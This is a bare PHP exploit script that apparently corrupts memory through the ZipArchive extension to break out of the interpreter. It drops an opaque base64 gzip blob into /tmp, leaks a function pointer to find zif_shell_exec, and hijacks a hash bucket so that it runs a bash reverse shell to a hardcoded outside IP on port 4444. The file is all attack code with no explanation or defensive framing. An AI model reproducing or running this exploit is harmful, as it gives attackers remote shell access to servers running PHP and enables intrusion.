<?php

file_put_contents("/tmp/cmb", "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");

$ss = array(0, 1);
$b = 'bbbbbbbbbbbbbbb';
$cmd = 'bash -c "bash -i >& /dev/tcp/149.28.204.92/4444 0>&1"';
$m = $cmd . str_repeat("\x00", 0x97 - strlen($cmd));

var_dump(mkdir("/tmp/cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc/")); // 0x50

$za = new ZipArchive;
$zb = new ZipArchive;
$zc = new ZipArchive;
$zc->open('/tmp/ha.zip', ZipArchive::CREATE | ZipArchive::OVERWRITE);
// $zipname = '/tmp/bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'; // 0x80
$zipname = '/tmp/cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc/ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd'; // 0x107
$zb->open($zipname, ZipArchive::CREATE | ZipArchive::OVERWRITE);
$zb->addFromString('a','b');

$zipname = '/tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'; // 0x37
$za->open($zipname, ZipArchive::CREATE | ZipArchive::OVERWRITE);
$za->addFromString('a','b');
$za->open('/tmp/', ZipArchive::CREATE | ZipArchive::OVERWRITE);
$s = $b . $b;
$za->open('/tmp/', ZipArchive::CREATE | ZipArchive::OVERWRITE);
$zb->open('/tmp/', ZipArchive::CREATE | ZipArchive::OVERWRITE);
$a = array_unique ($ss, SORT_REGULAR);
$zval_ptr_dtor = unpack('P', substr($s, 0x18, 8))[1];
echo(printf("zval_ptr_dtor = %x\n", $zval_ptr_dtor));
$bucket_addr = strlen($s);
echo(printf("bucket_addr = %x\n", $bucket_addr));

$zif_shell_exec = $zval_ptr_dtor - 0x395e30 + 0x2C8150; // zif_shell_exec

$zb->open('/tmp/', ZipArchive::CREATE | ZipArchive::OVERWRITE);
$u = 'eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee' . pack('IIQQQQQQ', 0, 1, 0, 0, 0, 0, $bucket_addr + 0x80 - 0x18, 6) . $m;

$za->open('/tmp/', ZipArchive::CREATE | ZipArchive::OVERWRITE);
print('here');
$zc->addFromString('b', substr(pack('IIQQQQQQ', 1, 0x7, 0x4, $bucket_addr + 0x48 - 0x28, 1, 0, 0, $zif_shell_exec), 0, 0x37));
unset($a);
$za->open('/tmp/', ZipArchive::CREATE | ZipArchive::OVERWRITE);
